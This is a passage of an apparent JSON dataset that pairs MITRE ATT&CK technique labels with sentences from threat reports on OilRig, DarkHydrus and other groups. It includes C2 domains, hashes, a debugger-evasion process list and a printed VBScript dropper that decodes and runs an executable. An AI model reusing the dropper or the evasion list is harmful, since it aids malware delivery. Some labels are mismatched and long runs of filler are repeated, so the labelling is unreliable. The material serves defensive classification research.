            "Palo Alto Networks customers are protected from this OilRig attack campaign and OopsIE by:  AutoFocus customers can track this Trojan with the OopsIE tag All known OopsIE samples are marked with malicious verdicts in WildFire All known OopsIE C2 domains have DNS signatures and are classified as Command and Control  \u00a0 Indicators of Compromise OopsIE Trojan 36e66597a3ff808acf9b3ed9bc93a33a027678b1e262707682a2fd1de7731e23 055b7607848777634b2b17a5c51da7949829ff88084c3cb30bcb3e58aae5d8e9 6b240178eedba4ebc9f1c8b56bac02676ce896e609577f4fb64fa977d67c0761 9e8ec04e534db1e714159cc68891be454c2459f179ab1df27d7f89d2b6793b17  OopsIE C2 defender-update[.]com windowspatch[.]com The post OilRig Targets a Middle Eastern Government and Adds Evasion Techniques to OopsIE appeared first on Palo Alto Networks Blog",
            "Once the QUADAGENT payload has executed, it will use rdppath[.]com as the C2, first via HTTPS, then HTTP, then via DNS tunneling, each being used as a corresponding fallback channel if the former fails",
            "When communicating with its C2 server, the downloaders use multiple protocols, specifically HTTPS, HTTP or DNS, each of which provide a fallback channel in that order",
            "The payload will communicate with its C2 server to obtain the session ID and pre-shared key and write it to this registry key in the following format: \u00a0 <session id>_<pre-shared key> \u00a0 To obtain the session ID and pre-shared key, the payload will first try to contact the C2 via an HTTPS GET request to the following URL: \u00a0 hxxps://www.rdppath[.]com/ \u00a0 If the above request using HTTPS does not result in an HTTP 200 OK message or the response data has no alphanumeric characters, the code will attempt to communicate with the C2 server using HTTP via the following URL: \u00a0 hxxp://www.rdppath[.]com/ \u00a0 The code to communicate with the C2 via HTTP exists within an exception handler",
            "For example, the following string would be included in one of the HTTP parameters sent to the C2 server: eRmaVsr90D-7Ig1ngV3PkdouzP974 In this specific case, the actor made a mistake when configuring this XAgent sample with its C2 locations",
            "The sample creates an array that contains the following strings for the Trojan to use as C2 locations: http://23.227.196[.]215/ http://apple-iclods[.]org/ http://apple-checker[.]org/ http://apple-uptoday[.]org/ http://apple-search[.]info Notice the last one is missing the trailing \u201c/\u201d, which causes an issue when the Trojan attempts to use this string to build the remainder of the C2 URL, as the Trojan will append the next string in the URL directly to this string"
        ]
    },
    "standard application layer protocol access token manipulation-multi": {
        "technique_names": [
            "standard application layer protocol",
            "access token manipulation"
        ],
        "sentances": [
            "Figure 5 HTTP POST request to obtain an OAUTH access token Figure 5 shows that the Trojan then uses the following regular expression to obtain the access token from the HTTP response: \\\u201daccess_token\\\u201d:(.*) Once authenticated with a valid access token, the Trojan will attempt to upload a file to the Google Drive account"
        ]
    },
    "process discovery": [
        "This field contains a URL that the Trojan will use to upload the contents of the <process ID of Trojan>.txt file, which will be structured as <process ID of Trojan>.<C2 domain> where the process ID is encoded with the same character substitution function as seen previously in Table 4",
        "The oldest known sample of the Delphi variant (SHA256: 5a02d4e5f6\u2026) provided us a much stronger linkage between this Delphi Cannon and Cannon, as this sample collects system information and sends it to the C2 email address, which includes the path of the running process appended to the string Running place",
        "The most notable change to this variant of Zebrocy, other than the programming language used, is the way the tool gathers the system information and running processes",
        "Gather domain and account names based on all running processes  Gathering account information from running processes",
        "Visitors are asked to download the \u201cUniversity Of Oxford Job Symposium Pre-Register Tool\u201d:  The downloaded file (which is also signed with an AI Squared certificate), is a fake registration tool built by the attackers: OxfordSymposiumRegTool.exe f77ee804de304f7c3ea6b87824684b33 If run by the victim, their computer would get infected, while they are shown this registration process:    Note that after completing the \u201cregistration process\u201d, the victim is asked to send the form to an email address in\u00a0oxford-careers[.]com, which also belongs to the attackers",
        "Figure 2: Process chain for the first part of the campaign Although the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it",
        "Verifies that there is no process with the name \u201crsyncd\u201d on the active process list (\u201cdbus-inotifier\u201d if the Trojan does not have root privileges)",
        "It searches the active process list for the systemd process",
        "Next, it checks the running processes against a list of hard-coded process names; if any are found, the machine is forcefully rebooted",
        "\u201cwin32_remote\u201c,\u201dwin64_remote64\u201c,\u201dollydbg\u201c,\u201dProcessHacker\u201c,\u201dtcpview\u201c,\u201dautoruns\u201c,\u201dautorunsc\u201c,\u201dfilemon\u201c,\u201dprocmon\u201c,\u201dregmon\u201c,\u201dprocexp\u201c,\u201didaq\u201c,\u201didaq64\u201c,\u201dImmunityDebugger\u201c,\u201dWireshark\u201c,\u201ddumpcap\u201c,\u201dHookExplorer\u201c,\u201dImportREC\u201c,\u201dPETools\u201c,\u201dLordPE\u201c,\u201ddumpcap\u201c,\u201dSysInspector\u201c,\u201dproc_analyzer\u201c,\u201dsysAnalyzer\u201c,\u201dsniff_hit\u201c,\u201dwindbg\u201c,\u201djoeboxcontrol\u201c,\u201djoeboxserver\u201c  Blacklisted process names in the malware In some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a BSOD via the ntdll.dll \u201cNtRaiseHardError\u201d function",
        "This directory will also contain the process id of the running malware in process.id and a \u201cbuild name\u201d (as it is called by the author) in build.id",
        "It is created as a separate process instead of child process of Office applications",
        "Enumerates running processes for \u201cWireshark\u201d and \u201cSysinternals\u201d",
        "What does the Poseidon Group do? What happens after a target machine is infected? Once the target\u2019s machine is compromised, the attacker first enumerates all processes running in the system and all services",
        "78 runin.bin List of processes names and associated plugins should be run inside these processes",
        "The command does not attempt to kill the specific Office process that would load the particular delivery document, such as Excel in the case of this \u201c.xlam\u201d file, but instead attempts to kill processes associated with Word, Excel, PowerPoint and Publisher",
        "While it includes multiple ways to find Explorer, the preferred method is to get the process id from the current desktop window.",
        "As part of the anti-debugging or anti-monitoring techniques, ShellTea iterates over all the running processes, applies CRC32 on each process name (after converting the string to capital letters), and then compares the value against a predefined set of CRCs.",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        " lists the running processes",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        "ps ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist ",
        " tasklist "
    ],
    "timestomp": [
        "The Trojan will then use the following regular expression to check the HTTP response to the content upload request for the file identifier value: \\\u201did\\\u201d:(.*) The Trojan will use this file identifier value to monitor for changes made to the file by the actor by checking for changes to the modification time of the <process ID of Trojan>.txt file",
        "After writing to this file, the Trojan will enter a loop to continually to check for changes to the modification time of this file, effectively waiting for the actor to make modifications to the file",
        "One of the documents we examined with the filename Rocket attacks on Israel.docx (SHA256: 34bdb5b364..) contained inconsistent creation and last modified timestamps, with the last modified timestamp occurring before the creation timestamp"
    ],
    "timestomp data staged shortcut modification remote file copy-multi": {
        "technique_names": [
            "timestomp",
            "data staged",
            "shortcut modification",
            "remote file copy"
        ],
        "sentances": [
            "The Trojan checks the modified time of the file by creating an HTTP request to a URL structured as follows: <Google Drive URL in \u2018gdu\u2019> + <file identifier> + \u201c?supportTeamDrives=true&fields=modifiedTime\u201d The Trojan then uses the following regular expression to obtain the modified time of the file from the HTTP response, which is saved to the variable named modification_time: \\\u201dmodifiedTime\\\u201d:(.*) The Trojan then uploads a second file to the Google Drive, the purpose of which is to allow the Trojan to continually write to this file as it waits for the actor to modify the first file uploaded"
        ]
    },
    "web service remote file copy-multi": {
        "technique_names": [
            "web service",
            "remote file copy"
        ],
        "sentances": [
            "In each iteration of the communications loop, the Trojan will check to see if the modification time of the first file changed, and if it is not updated the Trojan will update the second file by writing the string b<unique identifier>c<5 random lowercase characters>.<C2 domain> to the file by creating an HTTP POST request to a URL structured as follows: <Google Drive URL in \u2018gdue\u2019> + <second file identifier> + \u201c?supportsTeamDrive=true&uploadType=resumable&fields=kind,id,name,mimeType,parents\u201d In one RogueRobin sample (SHA256: f1b2bc0831\u2026), the author did not use the Google Drive URL provided by the actor when issuing the x_mode command, and instead included a \u00a0hardcoded Google Drive URL, as seen in Figure 6"
        ]
    },
    "timestomp file and directory discovery remote file copy-multi": {
        "technique_names": [
            "timestomp",
            "file and directory discovery",
            "remote file copy",
            "tor"
        ],
        "sentances": [
            "The Trojan downloads the contents of this file by crafting an HTTP request to a URL structured as follows: <Google Drive URL in \u2018gdu\u2019> + <first file identifier> + \u201c?alt=media\u201d With the contents of the file downloaded, the Trojan sets the modification_time variable to the current modification time so the Trojan knows when the actor makes further changes to the file"
        ]
    },
    "access token manipulation": [
        "The Trojan uses the access token to write the string above to the first file uploaded to Google drive whose filename is <process ID of Trojan>.txt",
        "Create a process by impersonating a logged-on user  Getting a user token using WTSQueryUserToken",
        "The tokens for each platform are hardcoded within the sample:November 2016 to January 2017: \"Evil New Year\" CampaignIn the early part of 2017, Group123 started the \"Evil New Year\" campaign"
    ],
    "data staged exfiltration over command and control channel exfiltration over alternative protocol data encrypted-multi": {
        "technique_names": [
            "data staged",
            "exfiltration over command and control channel",
            "exfiltration over alternative protocol",
            "data encrypted"
        ],
        "sentances": [
            "When the actor modifies the file and changes the modification_time, the Trojan downloads the contents from the file by creating an HTTP request to a URL structured as follows: <Google Drive URL in \u2018gdu\u2019> + <file identifier in \u2018f_id\u2019> + \u201c?alt=media\u201d The Trojan processes the downloaded data within the file the same way it would to obtain a job from data received from the DNS tunneling channel using the TXT query mode, specifically by searching the data using the following regular expression: ([^r-v\\\\s]+)[r-v]([\\\\w\\\\d+\\\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>) The Trojan function splits the matching data, specifically the subdomain on a separator that is a character between r and v and uses the data before the separator to get the sequence number and a Boolean value (0 or 1) if more data is expected"
        ]
    },
    "system service discovery new service-multi": {
        "technique_names": [
            "system service discovery",
            "new service"
        ],
        "sentances": [
            "Sample(s) f1b2bc0831445903c0d51b390b1987597009cc0fade009e07d792e8d455f6db0 5cc62ad6baf572dbae925f701526310778f032bb4a54b205bada78b1eb8c479c   DNS tbs1/tbs2.microsoftonline.services   Domains 0ffice365[.]agency    0ffice365[.]life    0ffice365[.]services    0nedrive[.]agency    corewindows[.]agency    microsoftonline[.]agency    onedrive[.]agency    sharepoint[.]agency    skydrive[.]agency    skydrive[.]services   Sample eb33a96726a34dd60b053d3d1048137dffb1bba68a1ad6f56d33f5d6efb12b97   DNS tvs1/tvs2.trafficmanager.live   Domains akamaiedge[.]live   \u00a0 akamaized[.]live   \u00a0 akdns[.]live   \u00a0 edgekey[.]live    Table 7: Sample and Domain Associations The third cluster of domains had six different nameservers associated with them, but unlike the other two clusters, were all directly tied to each other",
            "Reaver will then install itself as a service in the event it is running with SeDebugPrivilege privileges.\u00a0 The service is configured with a name, description, and display name that is provided within the configuration"
        ]
    },
    "system service discovery new service web service exploitation for client execution network service scanning service execution-multi": {
        "technique_names": [
            "system service discovery",
            "new service",
            "web service",
            "exploitation for client execution",
            "network service scanning",
            "service execution"
        ],
        "sentances": [
            "Palo Alto Networks customers are already be protected via:  All samples in this report have a malicious verdict in WildFire Domains have been classified as malicious AutoFocus tags are available for additional context: DarkHydrus and RogueRobin  Indicators of Compromise Delivery Document SHA256 513813af1590bc9edeb91845b454d42bbce6a5e2d43a9b0afa7692e4e500b4c8 e068c6536bf353abe249ad0464c58fb85d7de25223442dd220d64116dbf1e022 4e40f80114e5bd44a762f6066a3e56ccdc0d01ab2a18397ea12e0bc5508215b8 RogueRobin SHA256 eb33a96726a34dd60b053d3d1048137dffb1bba68a1ad6f56d33f5d6efb12b97 f1b2bc0831445903c0d51b390b1987597009cc0fade009e07d792e8d455f6db0 5cc62ad6baf572dbae925f701526310778f032bb4a54b205bada78b1eb8c479c RogueRobin C2s akdns[.]live akamaiedge[.]live edgekey[.]live akamaized[.]live 0ffice365[.]agency 0nedrive[.]agency corewindows[.]agency microsoftonline[.]agency onedrive[.]agency sharepoint[.]agency skydrive[.]agency 0ffice365[.]life 0ffice365[.]services skydrive[.]services skydrive[.]agency Nameservers tvs1.trafficmanager[.]live tvs2.trafficmanager[.]live tbs1.microsoftonline[.]services tbs2.microsoftonline[.]services brit.ns.cloudfronts[.]services dns.cloudfronts[.]services ns2.akadns[.]services britns.akadns[.]services britns.akadns[.]live ns2.akadns[.]live Related Domains iecvlist-microsoft[.]live data-microsoft[.]services asimov-win-microsoft[.]services onecs-live[.]services akamaiedge[.]services phicdn[.]world azureedge[.]today nsatc[.]agency Akamai[.]agency t-msedge[.]world"
        ]
    },
    "credential dumping credentials in files-multi": {
        "technique_names": [
            "credential dumping",
            "credentials in files",
            "ping"
        ],
        "sentances": [
            "\u0627\u0633\u062a\u0637\u0644\u0627\u0639.docx https://0utl00k[.]net/docs    Table 1 Additional DarkHydrus Word documents used to steal credentials Both of these related documents use the attachedTemplate technique to steal credentials by sending them to a URL https://0utl00k[.]net/docs",
            "Additional Features The Zyklon malware offers the following additional capabilities (via plugins): Browser Password Recovery Zyklon HTTP can recover passwords from popular web browsers, including:  Google Chrome Mozilla Firefox Internet Explorer Opera Browser Chrome Canary/SXS CoolNovo Browser Apple Safari Flock Browser SeaMonkey Browser SRWare Iron Browser Comodo Dragon Browser  FTP Password Recovery Zyklon currently supports FTP password recovery from the following FTP applications:  FileZilla SmartFTP FlashFXP FTPCommander Dreamweaver WS_FTP  Gaming Software Key Recovery Zyklon can recover PC Gaming software keys from the following games:  Battlefield Call of Duty FIFA NFS Age of Empires Quake The Sims Half-Life IGI Star Wars  Email Password Recovery Zyklon may also collect email passwords from following applications:  Microsoft Outlook Express Microsoft Outlook 2002/XP/2003/2007/2010/2013 Mozilla Thunderbird Windows Live Mail 2012 IncrediMail, Foxmail v6.x - v7.x Windows Live Messenger MSN Messenger Google Talk GMail Notifier PaltalkScene IM Pidgin (Formerly Gaim) Messenger Miranda Messenger Windows Credential Manager  License Key Recovery The malware automatically detects and decrypts the license/serial keys of more than 200 popular pieces of software, including Office, SQL Server, Adobe, and Nero"
        ]
    },
    "custom cryptographic protocol standard cryptographic protocol-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "standard cryptographic protocol"
        ],
        "sentances": [
            "RIPTIDE\u2019s first communication with its C2 server fetches an encryption key, and the RC4 encryption key is used to encrypt all further communication",
            "Figure 12: RSA public key 1    Figure 13: RSA public key 2    Figure 14: AES encryption parameters After encryption, the cipher text to be sent over C2 is Base64 encoded"
        ]
    },
    "file and directory discovery exploitation for client execution-multi": {
        "technique_names": [
            "file and directory discovery",
            "exploitation for client execution",
            "tor"
        ],
        "sentances": [
            "MD5 File Name Exploit 73f493f6a2b0da23a79b50765c164e88 \u8b70\u7a0b\u6700\u65b0\u4fee\u6b63\u53ca\u6ce8\u610f\u4e8b\u9805.doc CVE-2012-0158 f6fafb7c30b1114befc93f39d0698560 0824.1.doc CVE-2012-0158 eaa6e03d9dae356481215e3a9d2914dc \u7c21\u6613\u540d\u518a0\u5168\u570b\u5404\u8b66\u5bdf\u6a5f\u95dc\u4e3b\u5b98\u81f3\u5206\u5c40\u9577.doc CVE-2012-0158 06da4eb2ab6412c0dc7f295920eb61c4 \u9644\u6a94.doc CVE-2012-0158 53baedf3765e27fb465057c48387c9b6 103\u5e74\u7b2c3\u5c46\u901a\u8a0a\u9304.doc CVE-2012-0158 00a95fb30be2d6271c491545f6c6a707 2014 09 17 Welcome Reception for Bob and Jason_invitation.doc CVE-2012-0158 4ab6bf7e6796bb930be2dd0141128d06 \u7522\u8aee\u6703_Y103(2)\u59d4\u54e1\u6703_\u5f9e\u6771\u5354\u65b0\u8208\u570b\u5bb6\u5d1b\u8d77(0825).doc CVE-2012-0158   Figure 4: Identified exploit documents for HIGHTIDE\u00a0 When the file is opened, it drops HIGHTIDE in the form of an executable file onto the infected system",
            "Month File Name or Decoy Document Theme Suspected Target Region   Nov 2017 The NSA Telenor.doc Unknown Pakistan   Oct 2017 Circulars.doc dollar.doc Pakistan Federal Investigation Agency CV of Middle Eastern Civil Servant Turkey Pakistan \u00a0   Sep 2017 Iraq National Intelligence Service Kaspersky Security solution 2017.doc Iraq  Aug 2017 Arab Emirate \u0633\u0631\u06cc.docm Iraq Commission of Integrity Arab Emirates  Jul 2017 Requirements of the Sago.doc CommIT-Document.doc Confidential letters.doc Saudi Arabia Arab Emirates Pakistan   Jun 2017 Iraq Kurdistan Regional Government RFP_VOIP.doc Iraq  May 2017 RFP.doc Requirement.doc Iraq Kurdistan Regional Government Georgia Iraq   Mar 2017 court.doc Georgia   Feb 2017 CERT-Audit-20172802-GEO.xls Georgia  Table 1 \u2013 Examples of the lure documents observed in the MuddyWater attacks"
        ]
    },
    "application window discovery fallback channels-multi": {
        "technique_names": [
            "application window discovery",
            "fallback channels"
        ],
        "sentances": [
            "GET /<string>/<5 digit number>/<4 character string>.php?<first 3 characters of last string>_id=<43 character string>= HTTP/1.1 Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */* User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E) Host: <C2 Location> Cache-Control: no-cache    Figure 6: Sample GET request for WATERSPOUT backdoor Although there are no current infrastructure ties to link this backdoor to APT12, there are several data points that show a possible tie to the same actors:  Same initial delivery method (spear phishing email) with a Microsoft Word Document exploiting CVE-2012-0158"
        ]
    },
    "security software discovery data from local system-multi": {
        "technique_names": [
            "security software discovery",
            "data from local system"
        ],
        "sentances": [
            "Japanese Tech Company Taiwanese Government Organizations Organizations in the Asia-Pacific Region that are of Interest to China   The WATERSPOUT backdoor was written to the same file path as the HIGHTIDE backdoors:  C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\word.exe C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\winword.exe   WATERSPOUT was compiled within two days of the last HIGHTIDE backdoor and on the same day as the THREEBYTE backdoor"
        ]
    },
    "disabling security tools": [
        "Figure\u00a06 Relational diagram of artifacts\u00a0 We created a timeline of the activity based off the data we collected, and found that the attack dates were tightly clustered into two waves in mid- to late-October and in mid-November as we see in Figure 7 using the timestamps from Table 3",
        "Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPV       Figure 15: Disabling Microsoft Office Protected View  Ability to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16",
        "From an infrastructure point of view there is no overlap between the two sets of activity, the only overlap is the use of the unique tool \u201cDNSMessenger\u201d  When these points are considered together in conjunction with the significant difference in targeting they make a strong case for classifying this activity as distinct from FIN7 activity",
        "- There were two interesting sub-classes found inside Main Activity: Receiver\u00a0and\u00a0Sender"
    ],
    "data from local system file and directory discovery-multi": {
        "technique_names": [
            "data from local system",
            "file and directory discovery",
            "tor"
        ],
        "sentances": [
            "Filename Created On Last Modified First Seen Total Time (In Days)   Passport.docx instruction.docx 9/11/18 04:22 10/13/18 08:21 10/18/18 07:38 37.1   DN_325_170428_DEA\u2026invitation.docx 9/11/18 04:22 10/13/18 08:21 10/25/18 08:15 44.12   crash list(Lion Air Boeing 737).docx \u0411\u0443\u0440\u0445\u0430\u043d\u043e\u0432.docx 9/11/18 04:22 10/13/18 08:21 11/01/18 06:50 51.1   \u0417\u0430\u044f\u0432\u043b\u0435\u043d\u0438\u0435.docx 9/11/18 04:22 10/13/18 08:21 11/01/18 11:41 51.3   1500029.docx 10/18/18 06:59 10/18/18 07:00 10/18/18 08:47 0.4   2018_10_13_17_15_21.docx 10/18/18 06:59 10/18/18 07:00 10/24/18 07:38 6.2   Rocket attacks on Israel.docx 11/13/18 12:17 11/13/18 10:46 11/14/18 05:14 0.7   Brexit 15.11.2018.docx DIP 89 OIC Condemns 14 Nov Attacks.docx 15.11 attacks.docx 11/14/18 14:17 11/15/18 04:50 11/15/18 06:28 0.8   201811131257.docx 11/14/18 14:33 11/15/18 04:50 11/15/18 12:31 0.9    Table 3 Timestamps of delivery documents (all times in UTC)  Figure 7 Dear Joohn timeline Based off the timestamps we have, four delivery documents were initially created on September 11, 2018 04:22 UTC"
        ]
    },
    "timestomp system time discovery-multi": {
        "technique_names": [
            "timestomp",
            "system time discovery"
        ],
        "sentances": [
            "When comparing the provided timestamps of the delivery documents to the timestamps for the remote template documents from Table 2, we find that the time to attack is directly correlated to the last time the templates are modified",
            "The Trojan compares the TimeZone.CurrentTimeZone.DaylightName property to strings Iran, Arab, Arabia and Middle East, which will match the following time zones in Windows: \u00a0 Arabic Daylight Time (UTC+3) Arab Daylight Time (UTC+3) Arabian Daylight Time (UTC+4) Middle East Daylight Time (UTC+2) Iran Daylight Time (UTC+3.5) According to MSDN, these five time zones encompass 10 countries that fall within UTC+2, +3, +3.5 or +4 as seen in Figure 3"
        ]
    },
    "scripting obfuscated files or information-multi": {
        "technique_names": [
            "scripting",
            "obfuscated files or information"
        ],
        "sentances": [
            "The Payloads The delivery documents in this attack campaign loaded remote templates whose macros installed a variety of first-stage payloads",
            "The last query is to the subdomain ihc[.]stage[.]12019683[.]ns2[.]true-deals[.]com): \u00a0 The delivered second stage shellcode is encrypted:  METERPRETER: After decryption of the second stage shellcode, the shellcode deletes the \u2018MZ\u2019 prefix from within a very important part of the shellcode",
            "SCT File Analysis The code of the Defender.sct file is an obfuscated JavaScript",
            "Analysis starts with a zlib decompression (a standard action of HWP documents) and we're able to recover the following script:const strEncode = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hV[...redacted...]AAAAAAAAAAAAAAAAAAAAAA=\"DIM outFileDIM base64DecodedDIM shell_objSET shell_obj = CreateObject(\"WScript.Shell\")DIM fsoSET fso = CreateObject(\"Scripting.FileSystemObject\")outFile = \"c:\\ProgramData\\HncModuleUpdate.exe\"base64Decoded = decodeBase64(strEncode)IF NOT(fso.FileExists(outFile)) thenwriteBytes outFile, base64Decodedshell_obj.run outFileEND IFWScript.Quit()private function decodeBase64(base64)DIM DM, ELSET DM = CreateObject(\"Microsoft.XMLDOM\")SET EL = DM.createElement(\"tmp\")EL.DataType = \"bin.base64\"EL.Text = base64decodeBase64 = EL.NodeTypedValueend functionprivate Sub writeBytes(file, bytes)DIM binaryStreamSET binaryStream = CreateObject(\"ADODB.Stream\")binaryStream.Type = 1binaryStream.OpenbinaryStream.Write bytesbinaryStream.SaveToFile file, 1End SubThis script is executed and is used to decode a static base64 string within the strEncode variable"
        ]
    },
    "account discovery": [
        "SHA256 Compiled C2 account POP3S Account SMTPS Accounts   861b6bc1f9.",
        "ARTIFACTS: Documents:     2781526f6b302da00661b9a6a625a5a6ecf4ffccafa61202e9b0e9b61b657867     c357396ca82fdcd6b6f46b748f2b6941051dbc81be5326cf9548e6e95507af7c     ffebcc4d2e851baecd89bf11103e3c9de86f428fdeaf0f8b33d9ea6f5ef56685     Domains:  true-deals[.]com;\u00a0strikes-withlucky[.]com Email account in registration is: isvarawski@yahoo.com Attacker email account:\u00a0adrian.1987clark@yahoo.com",
        "Restricting these privileges may prevent malware from running or limit its capability to spread through the network.Carefully consider the risks before granting administrative rights to users on their own machines.Scrub and verify all administrator accounts regularly.Configure Group Policy to restrict all users to only one login session, where possible.Enforce secure network authentication, where possible.Instruct administrators to use non-privileged accounts for standard functions such as web browsing or checking webmail.Segment networks into logical enclaves and restrict host-to-host communication paths",
        "This may include information about the currently logged in user, the hostname, network configuration data, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data",
        "AutoFocus customers may learn more from the DarkHydrus tag  IOC Related SHA256 Hashes Payloads cec36e8ed65ac6f250c05b4a17c09f58bb80c19b73169aaf40fa15c8d3a9a6a1 ac7f9c536153780ccbec949f23b86f3d16e3105a5f14bb667df752aa815b0dc4 a547a02eb4fcb8f446da9b50838503de0d46f9bb2fd197c9ff63021243ea6d88 d428d79f58425d831c2ee0a73f04749715e8c4dd30ccd81d92fe17485e6dfcda dd2625388bb2d2b02b6c10d4ee78f68a918b25ddd712a0862bcf92fa64284ffa b2571e3b4afbce56da8faa726b726eb465f2e5e5ed74cf3b172b5dd80460ad81 c8b3d4b6acce6b6655e17255ef7a214651b7fc4e43f9964df24556343393a1a3 ce84b3c7986e6a48ca3171e703e7083e769e9ced1bbdd7edf8f3eab7ce20fd00 99541ab28fc3328e25723607df4b0d9ea0a1af31b58e2da07eff9f15c4e6565c Delivery documents d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318 8063c3f134f4413b793dfc05f035b6480aa1636996e8ac4b94646292a5f87fde 9eac37a5c675cd1750cd50b01fc05085ce0092a19ba97026292a60b11b45bf49 cf9b2b40ac621aaf3241ff570bd7a238f6402102c29e4fbba3c5ce0cb8bc25f9 0a3d5b2a8ed60e0d96d5f0d9d6e00cd6ab882863afbb951f10c395a3d991fbc1 0b1d5e17443f0896c959d22fa15dadcae5ab083a35b3ff6cb48c7f967649ec82 870c8b29be2b596cc2e33045ec48c80251e668abd736cef9c5449df16cf2d3b8 ff0b59f23630f4a854448b82f1f0cd66bc4b1124a3f49f0aecaca28309673cb0 01fd7992aa71f4dca3a3766c438fbabe9aea78ca5812ab75b5371b48bd2625e2 6dcb3492a45a08127f9816a1b9e195de2bb7e0731c4e7168392d0e8068adae7a 47b8ad55b66cdcd78d972d6df5338b2e32c91af0a666531baf1621d2786e7870 776c056096f0e73898723c0807269bc299ae3bbd8e9542f0a1cbba0fd3470cb4 cf7863e023475d695c6f72c471d314b8b1781c6e9087ff4d70118b30205da5f0 e88045931b9d99511ce71cc94f2e3d1159581e5eb26d4e05146749e1620dc678 26e641a9149ff86759c317b57229f59ac48c5968846813cafb3c4e87c774e245 b5cfaac25d87a6e8ebabc918facce491788863f120371c9d00009d78b6a8c350 ad3fd1571277c7ce93dfbd58cee3b3bec84eeaf6bb29a279ecb6a656028f771c Related Domains maccaffe[.]com cisc0[.]net 